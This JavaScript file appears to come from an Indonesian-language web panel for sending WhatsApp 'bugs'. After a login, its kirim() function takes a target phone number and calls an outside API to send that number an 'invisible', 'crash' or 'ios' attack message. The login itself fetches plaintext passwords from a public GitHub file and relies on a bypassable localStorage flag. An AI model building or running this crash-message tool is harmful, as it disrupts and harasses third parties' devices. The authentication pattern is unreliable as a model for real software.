const URL = 'https://raw.githubusercontent.com/rexz26hff/Website-protofilio-kelas-/main/logindata.json';

// Login handling
async function login(){
  const u = document.getElementById('u').value.trim();
  const p = document.getElementById('p').value.trim();
  const e = document.getElementById('e');
  try {
    const jd = await (await fetch(URL)).json();
    const ok = jd.users.find(x=>x.username===u && x.password===p);
    if(ok){ localStorage.setItem('logged','1'); location='index.html'; }
    else e.innerText='User atau password salah!';
  } catch {
    e.innerText='Gagal ambil data!';
  }
}

// Proteksi akses index.html
if(location.pathname.endsWith('index.html') && !localStorage.getItem('logged'))
  location='login.html';

// Logout
function logout(){ localStorage.removeItem('logged'); location='login.html'; }

// Kirim bug WA
async function kirim(tipe) {
  const target = document.getElementById("target").value.trim();
  if (!target) return alert("Masukkan nomor terlebih dahulu!");
  
  const typeMap = {
    invisible: "1",
    crash: "2",
    ios: "1" // Misalnya ios pakai fc1 juga
  };
  
  const type = typeMap[tipe] || "1";
  
  try {
    const res = await fetch(`https://bug-api.repl.co/radzzoffc?chatId=${target}&type=${type}`);
    const result = await res.json();
    
    if (result.success) {
      alert(`✅ Bug "${tipe}" berhasil dikirim ke ${target}`);
    } else {
      alert("❌ Gagal mengirim bug: " + (result.error || "Unknown error"));
    }
  } catch (err) {
    console.error(err);
    alert("❌ Gagal kirim. Periksa koneksi atau API.");
  }
}
